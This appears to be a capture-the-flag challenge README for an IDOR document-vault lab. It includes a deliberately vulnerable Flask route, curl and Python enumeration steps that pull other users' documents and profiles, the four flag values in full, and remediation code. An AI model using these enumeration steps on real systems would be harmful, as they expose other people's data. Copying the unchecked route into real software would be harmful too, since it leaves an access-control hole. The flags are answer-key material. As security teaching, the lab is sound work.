# Delta - IDOR Document Vault

**Status:** ✅ Complete

**EverSec's Document Vault keeps your files safe and organized. Each document has a unique ID for easy retrieval. What could go wrong?**

## Summary

Delta teaches **Insecure Direct Object Reference (IDOR)** vulnerabilities through a corporate document management system. Players discover that being authenticated doesn't mean you're authorized — the application checks *who you are* but never checks *what you can access*. By manipulating document IDs in URLs and API endpoints, players can access confidential files belonging to other users, enumerate all documents in the system, retrieve soft-deleted records, and even steal user profile data. This challenge demonstrates that proper authorization checks are just as critical as authentication, and that IDOR vulnerabilities can affect any resource with a predictable identifier.

## Challenge Info

| Field | Value |
|-------|-------|
| **Category** | Web - Access Control |
| **Difficulty** | Easy-Medium |
| **Port** | 4001 |
| **Total Points** | 700 |
| **Flags** | 4 |

## Learning Objectives

- Understand Insecure Direct Object Reference (IDOR) vulnerabilities
- Distinguish between authentication (who you are) and authorization (what you can access)
- Exploit predictable sequential identifiers
- Enumerate resources via API endpoints
- Understand that soft-deleted data may still be accessible
- Recognize that IDOR applies to any resource type, not just files

## Setup

### Docker Compose (Recommended)
```bash
docker compose up -d delta-idor-document-vault
```

### Standalone Docker
```bash
cd Challenges/delta-idor-document-vault
docker build -t delta-idor .
docker run -p 4001:4001 \
  -e FLAG1=1d0r_bur1ed_tr34sur3 \
  -e FLAG2=3num3r4t3_4ll_th3_th1ngs \
  -e FLAG3=d3l3t3d_but_n0t_g0n3 \
  -e FLAG4=1d0r_us3r_pr0f1l3_pwn3d \
  delta-idor
```

## Vulnerability

The Document Vault checks **authentication** (are you logged in?) but never checks **authorization** (are you allowed to access this specific resource?). Any authenticated user can:

1. View any document by changing the document ID in the URL
2. Access documents marked as "deleted" via direct ID
3. List all documents via the API regardless of ownership
4. View any user's profile via the API by changing the user ID

```python
@app.route('/document/<int:doc_id>')
@login_required
def view_document(doc_id):
    # No ownership check - just fetch and return
    document = conn.execute('SELECT * FROM documents WHERE id = ?', (doc_id,)).fetchone()
```

## Solution

### FLAG 1 - Adjacent Document Access (100 pts)

**Skill**: Basic IDOR - changing a single parameter

1. Find credentials (check the page source)
2. Log in and observe your assigned documents (IDs 1042, 1043)
3. View document 1043 - notice the URL: `/document/1043`
4. Try the next ID: `/document/1044`
5. Document 1044 is a confidential penetration test report containing FLAG1

**Flag**: `1d0r_bur1ed_tr34sur3`

### FLAG 2 - API Enumeration (200 pts)

**Skill**: API discovery + wide-range enumeration

1. Discover the API documentation at `/api`
2. Use the documented endpoint: `/api/documents`
3. This returns all non-deleted documents with their IDs and titles
4. Notice document 9999 ("Master Recovery Keys") at the end of the list
5. Access `/document/9999` to retrieve FLAG2

```bash
# List all documents
curl -b cookies.txt http://localhost:4001/api/documents | python3 -m json.tool

# Access the hidden document
curl -b cookies.txt http://localhost:4001/document/9999
```

**Flag**: `3num3r4t3_4ll_th3_th1ngs`

### FLAG 3 - Soft-Deleted Document (150 pts)

**Skill**: Understanding soft-delete vs hard-delete

1. The `/api/documents` endpoint filters out deleted documents (`WHERE is_deleted = 0`)
2. But the `/document/<id>` endpoint has no such filter
3. Document 7777 is a soft-deleted incident report - not in the API listing, but still accessible
4. Access `/document/7777` directly

Players can find this through brute-force enumeration of IDs not in the API listing, or by noticing gaps in the document ID sequence.

```bash
# This document won't appear in:
curl -b cookies.txt http://localhost:4001/api/documents

# But it's still accessible:
curl -b cookies.txt http://localhost:4001/document/7777
```

**Flag**: `d3l3t3d_but_n0t_g0n3`

### FLAG 4 - Cross-Resource IDOR (250 pts)

**Skill**: Applying IDOR concepts to different resource types

1. The API docs at `/api` document a `/api/users/{id}` endpoint
2. Access your own profile: `/api/users/1`
3. Try other user IDs: `/api/users/2` (manager), `/api/users/3` (admin)
4. The admin user's `internal_notes` field contains backup codes — which is FLAG4

```bash
# Your profile
curl -b cookies.txt http://localhost:4001/api/users/1

# Admin profile with FLAG4 in internal_notes
curl -b cookies.txt http://localhost:4001/api/users/3
```

**Key insight**: IDOR isn't just about documents. Any resource with a predictable identifier and missing authorization checks is vulnerable — user profiles, orders, invoices, tickets, etc.

**Flag**: `1d0r_us3r_pr0f1l3_pwn3d`

## Alternative Approaches

### Python Enumeration Script
```python
import urllib.request, json

# Login
login_data = b'username=employee&password=password123'
req = urllib.request.Request('http://localhost:4001/login', data=login_data)
req.add_header('Content-Type', 'application/x-www-form-urlencoded')
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
opener.open(req)

# Enumerate documents via API
resp = opener.open('http://localhost:4001/api/documents')
docs = json.loads(resp.read())
for doc in docs['documents']:
    print(f"ID: {doc['id']} - {doc['title']} {'[CONFIDENTIAL]' if doc['confidential'] else ''}")

# Enumerate user profiles
for uid in range(1, 10):
    try:
        resp = opener.open(f'http://localhost:4001/api/users/{uid}')
        user = json.loads(resp.read())
        print(f"User {uid}: {user['username']} ({user['role']}) - Notes: {user['internal_notes']}")
    except:
        pass
```

### Burp Suite
1. Capture a document request in Proxy
2. Send to Intruder
3. Set payload position on the document ID
4. Use number range payload (1-10000)
5. Filter responses by status code (200 = document exists)

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Look at the URL when you view a document you own. What makes each document unique in that URL — and does the application actually verify you're the owner before serving it?

</details>

<details>
<summary>Hint 2</summary>

Document IDs appear to be sequential integers. If other users have documents, their IDs exist too. How would you discover them?

</details>

<details>
<summary>Hint 3</summary>

Deletion doesn't always mean removal. Applications sometimes mark records as hidden rather than deleting them from the database. Are there documents that don't appear in the normal listing but might still be directly accessible?

</details>

## Prevention & Remediation

### 1. Implement Authorization Checks
```python
@app.route('/document/<int:doc_id>')
@login_required
def view_document(doc_id):
    document = conn.execute(
        'SELECT * FROM documents WHERE id = ? AND owner_id = ? AND is_deleted = 0',
        (doc_id, session['user_id'])
    ).fetchone()
    if not document:
        abort(403)
```

### 2. Use Non-Predictable Identifiers
```python
import uuid
doc_id = str(uuid.uuid4())  # e.g., "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
```

### 3. Implement Access Control Lists
```python
def user_can_access(user_id, doc_id):
    acl = conn.execute(
        'SELECT * FROM document_acl WHERE user_id = ? AND document_id = ?',
        (user_id, doc_id)
    ).fetchone()
    return acl is not None
```

### 4. Filter Deleted Records at Query Level
```python
# Always filter soft-deleted records
document = conn.execute(
    'SELECT * FROM documents WHERE id = ? AND is_deleted = 0', (doc_id,)
).fetchone()
```

## References

- [OWASP Testing Guide - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [OWASP API Security Top 10 - BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)

## Challenge Metadata

| Field | Value |
|-------|-------|
| **Author** | EverSec CTF Team |
| **Difficulty** | Easy-Medium |
| **Skills Required** | HTTP basics, URL manipulation, API interaction |
| **Skills Learned** | IDOR exploitation, API enumeration, authorization testing |
| **Tools** | Browser, curl, Python (optional) |
